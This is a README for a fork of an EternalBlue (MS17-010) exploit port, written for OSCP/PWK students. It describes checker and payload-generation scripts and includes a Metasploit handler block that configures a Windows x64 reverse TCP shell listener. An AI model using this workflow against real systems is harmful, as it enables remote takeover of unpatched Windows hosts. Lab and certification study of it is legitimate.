# MS17-010

## Intro
This repository is forked from the fantastic work by [Worawit](https://github.com/worawit/MS17-010/) on the NSA's exploit leaked by the ShadowBrokers.

This is a python port of the exploit and has an excellent reliability for exploiting Windows OS that are vulnerable to [MS17-010/EternalBlue](http://www.wired.co.uk/article/what-is-eternal-blue-exploit-vulnerability-patch).
use the checker.py script to see if the target is unpatched/vulnerable.

Worawits script is great but its not so simple or quick to compile and has many moving parts to get up and running. 
It is necessary to work with raw Assembly language, shellcode for multiple architectures, msfconsole etc. 

What I have created a very handy bash script which will do all of the hard work for you and also gives instructions on how to exploit.

## Why create this ?
Because knowing how the exploit works is a lot more fun that firing up metasploit as well as that I created this out of necessity for the PWK course
and the OSCP certification. Those of you undertaking either will be well aware of the fact that Metasploit is extremely limited during exam time, so this 
exploit offers you a very fast reliable and allowed way to exploit any targets with port 445,139 open that are vulnerable.

My generation script will output 2 files that can be read into msfconsole by using the -r flag (msfconsole -r /root/EternalBlueX64.rc), so you dont have to keep typing out 
```
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set EXITFUNC thread
set ExitOnSession false
set LHOST 192.168.*.**
set LPORT 5555
exploit -j
```

fire up  the script and just follow the on screen instructions after the 7 step generation process.
